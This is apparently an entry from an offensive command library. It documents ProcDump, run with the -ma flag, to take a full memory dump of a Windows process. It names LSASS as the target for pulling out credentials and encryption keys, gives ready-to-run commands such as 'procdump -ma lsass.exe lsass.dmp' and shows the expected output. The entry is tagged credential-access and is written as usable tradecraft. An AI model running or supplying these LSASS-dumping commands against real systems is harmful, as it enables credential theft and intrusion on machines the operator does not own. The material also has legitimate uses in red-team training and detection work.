---
type: command
executor: cmd
data: procdump -ma $_PROCESS_NAME $_OUTPUT_FILE
output: |-
  ProcDump v10.1 - Sysinternals Process Dump
  Copyright (C) 2008-2018 Mark Russinovich
  Sysinternals - www.sysinternals.com

  Process: $_PROCESS_NAME (main process ID $_PID)

  [00:00:00] Dumping process memory (priority 10)...
  Dump file(s) created successfully.
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - memory
  - credential-access
  - dump
verified: true
validated: true
---

# procdump-full-memory-dump

## Command

```cmd
procdump -ma $_PROCESS_NAME $_OUTPUT_FILE
```

## Description

Generates a full memory dump of a specified Windows process, capturing all committed memory pages. This is commonly used to extract sensitive information such as credentials or encryption keys from processes like LSASS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROCESS_NAME | The name or PID of the target process (e.g., lsass.exe or 1234) | Yes |
| $_OUTPUT_FILE | The path and filename for the output dump file (e.g., lsass.dmp) | Yes |
| -ma | Flag to create a full memory dump including all private and shareable memory | Built-in |

## Examples

### Basic Usage

```cmd
procdump -ma lsass.exe lsass.dmp
```

### Advanced Usage

```cmd
procdump -accepteula -ma lsass.exe lsass_%date%_%time%.dmp
```

## Expected Output

ProcDump will output progress information during the dump creation and confirm success with a message indicating the dump file has been created. Example:

ProcDump v10.1 - Sysinternals Process Dump
Copyright (C) 2008-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

Process: lsass.exe (main process ID 796)

[00:00:01] Dumping process memory (priority 10)...
Dump file(s) created successfully.

## Related

- [[tools/ProcDump]]
